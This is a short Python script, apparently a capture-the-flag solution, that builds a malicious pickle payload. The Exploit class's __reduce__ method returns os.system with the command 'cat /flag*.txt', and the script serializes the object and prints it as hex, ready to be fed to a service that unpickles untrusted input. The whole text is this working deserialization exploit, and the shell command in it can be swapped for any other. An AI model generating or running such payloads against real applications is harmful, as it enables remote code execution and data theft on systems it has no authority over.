import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ("cat /flag*.txt",))

payload_bytes = pickle.dumps(Exploit())
payload_hex = payload_bytes.hex()

print(payload_hex)